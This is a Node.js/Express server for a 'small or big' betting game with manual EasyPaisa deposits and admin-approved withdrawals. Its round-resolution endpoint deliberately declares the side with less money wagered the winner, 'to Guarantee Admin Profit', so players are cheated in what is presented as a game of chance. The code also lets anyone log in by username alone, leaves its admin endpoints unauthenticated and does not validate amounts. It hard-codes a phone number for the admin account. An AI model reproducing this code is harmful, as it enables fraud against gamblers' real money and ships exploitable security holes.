const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Database Setup
const db = new sqlite3.Database('./database.db', (err) => {
  if (err) console.error("Database connection error:", err);
  else console.log("Connected to SQLite Database.");
});

// Initialize Tables
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    phone TEXT,
    balance REAL DEFAULT 0.0,
    role TEXT DEFAULT 'user'
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    type TEXT, -- 'deposit' or 'withdraw'
    amount REAL,
    trx_id TEXT,
    screenshot TEXT,
    account_details TEXT,
    status TEXT DEFAULT 'pending', -- 'pending', 'approved', 'rejected'
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS bets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    round_id INTEGER,
    choice TEXT, -- 'small' or 'big'
    amount REAL,
    status TEXT DEFAULT 'pending', -- 'pending', 'win', 'loss'
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS game_rounds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    winning_choice TEXT,
    total_small_amount REAL DEFAULT 0,
    total_big_amount REAL DEFAULT 0,
    status TEXT DEFAULT 'active', -- 'active', 'completed'
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  
  // Seed initial game round if none exists
  db.get("SELECT * FROM game_rounds WHERE status = 'active'", (err, row) => {
    if (!row) {
      db.run("INSERT INTO game_rounds (status) VALUES ('active')");
    }
  });

  // Seed default admin user
  db.get("SELECT * FROM users WHERE username = 'admin'", (err, row) => {
    if (!row) {
      db.run("INSERT INTO users (username, phone, balance, role) VALUES ('admin', '03453067511', 100000, 'admin')");
    }
  });
});

// User Register / Login
app.post('/api/login', (req, res) => {
  const { username, phone } = req.body;
  db.get("SELECT * FROM users WHERE username = ?", [username], (err, user) => {
    if (user) {
      res.json({ success: true, user });
    } else {
      db.run("INSERT INTO users (username, phone) VALUES (?, ?)", [username, phone], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, user: { id: this.lastID, username, phone, balance: 0, role: 'user' } });
      });
    }
  });
});

// Get User Profile
app.get('/api/user/:id', (req, res) => {
  db.get("SELECT * FROM users WHERE id = ?", [req.params.id], (err, user) => {
    if (err || !user) return res.status(404).json({ error: "User not found" });
    res.json(user);
  });
});

// Deposit Request (Manual EasyPaisa)
app.post('/api/deposit', (req, res) => {
  const { user_id, amount, trx_id, screenshot } = req.body;
  db.run("INSERT INTO transactions (user_id, type, amount, trx_id, screenshot, status) VALUES (?, 'deposit', ?, ?, ?, 'pending')",
    [user_id, amount, trx_id, screenshot || ''], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ success: true, message: "Deposit request submitted. Awaiting admin approval." });
    });
});

// Withdraw Request
app.post('/api/withdraw', (req, res) => {
  const { user_id, amount, account_details } = req.body;
  
  db.get("SELECT balance FROM users WHERE id = ?", [user_id], (err, user) => {
    if (!user || user.balance < amount) {
      return res.status(400).json({ error: "Insufficient balance." });
    }

    db.run("INSERT INTO transactions (user_id, type, amount, account_details, status) VALUES (?, 'withdraw', ?, ?, 'pending')",
      [user_id, amount, account_details], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, message: "Withdrawal request submitted." });
      });
  });
});

// Place Bet on Small or Big
app.post('/api/bet', (req, res) => {
  const { user_id, choice, amount } = req.body; // choice: 'small' or 'big'

  db.get("SELECT balance FROM users WHERE id = ?", [user_id], (err, user) => {
    if (!user || user.balance < amount) {
      return res.status(400).json({ error: "Insufficient balance" });
    }

    // Deduct user balance for bet
    db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [amount, user_id], (err) => {
      if (err) return res.status(500).json({ error: err.message });

      db.get("SELECT * FROM game_rounds WHERE status = 'active' ORDER BY id DESC LIMIT 1", (err, round) => {
        if (!round) return res.status(500).json({ error: "No active round found" });

        // Insert bet
        db.run("INSERT INTO bets (user_id, round_id, choice, amount) VALUES (?, ?, ?, ?)",
          [user_id, round.id, choice, amount], (err) => {
            if (err) return res.status(500).json({ error: err.message });

            // Update round totals
            const field = choice === 'small' ? 'total_small_amount' : 'total_big_amount';
            db.run(`UPDATE game_rounds SET ${field} = ${field} + ? WHERE id = ?`, [amount, round.id]);

            res.json({ success: true, message: "Bet placed successfully" });
          });
      });
    });
  });
});

// Smart Resolution API for Small & Big Game (Calculates Lowest Pool as Winner to Guarantee Admin Profit)
app.post('/api/admin/resolve-round', (req, res) => {
  db.get("SELECT * FROM game_rounds WHERE status = 'active' ORDER BY id DESC LIMIT 1", (err, round) => {
    if (!round) return res.status(400).json({ error: "No active round" });

    // Smart Logic: Pick the choice with LESS money placed on it!
    let winningChoice = 'small';
    if (round.total_small_amount > round.total_big_amount) {
      winningChoice = 'big';
    } else if (round.total_big_amount > round.total_small_amount) {
      winningChoice = 'small';
    } else {
      // If equal, default to 'small'
      winningChoice = 'small';
    }

    // Update current round as completed
    db.run("UPDATE game_rounds SET status = 'completed', winning_choice = ? WHERE id = ?", [winningChoice, round.id], (err) => {
      // Process Bets for this round
      db.all("SELECT * FROM bets WHERE round_id = ?", [round.id], (err, bets) => {
        bets.forEach(bet => {
          if (bet.choice === winningChoice) {
            // Winner gets 2x return
            const winAmount = bet.amount * 2;
            db.run("UPDATE bets SET status = 'win' WHERE id = ?", [bet.id]);
            db.run("UPDATE users SET balance = balance + ? WHERE id = ?", [winAmount, bet.user_id]);
          } else {
            db.run("UPDATE bets SET status = 'loss' WHERE id = ?", [bet.id]);
          }
        });

        // Start a new active round
        db.run("INSERT INTO game_rounds (status) VALUES ('active')", function(err) {
          res.json({
            success: true,
            round_id: round.id,
            winning_choice: winningChoice,
            total_small: round.total_small_amount,
            total_big: round.total_big_amount,
            new_round_id: this.lastID
          });
        });
      });
    });
  });
});

// Admin API: List Pending Transactions
app.get('/api/admin/transactions', (req, res) => {
  db.all("SELECT transactions.*, users.username, users.phone FROM transactions JOIN users ON transactions.user_id = users.id WHERE status = 'pending'", (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Admin API: Approve/Reject Transaction
app.post('/api/admin/transaction-action', (req, res) => {
  const { transaction_id, action } = req.body; // action: 'approve' or 'reject'

  db.get("SELECT * FROM transactions WHERE id = ?", [transaction_id], (err, tx) => {
    if (!tx || tx.status !== 'pending') return res.status(400).json({ error: "Invalid transaction" });

    if (action === 'approve') {
      db.run("UPDATE transactions SET status = 'approved' WHERE id = ?", [transaction_id], (err) => {
        if (tx.type === 'deposit') {
          db.run("UPDATE users SET balance = balance + ? WHERE id = ?", [tx.amount, tx.user_id]);
        } else if (tx.type === 'withdraw') {
          db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [tx.amount, tx.user_id]);
        }
        res.json({ success: true, message: "Transaction approved." });
      });
    } else {
      db.run("UPDATE transactions SET status = 'rejected' WHERE id = ?", [transaction_id], (err) => {
        res.json({ success: true, message: "Transaction rejected." });
      });
    }
  });
});

// Serve frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`World Gaming Server running on port ${PORT}`);
});
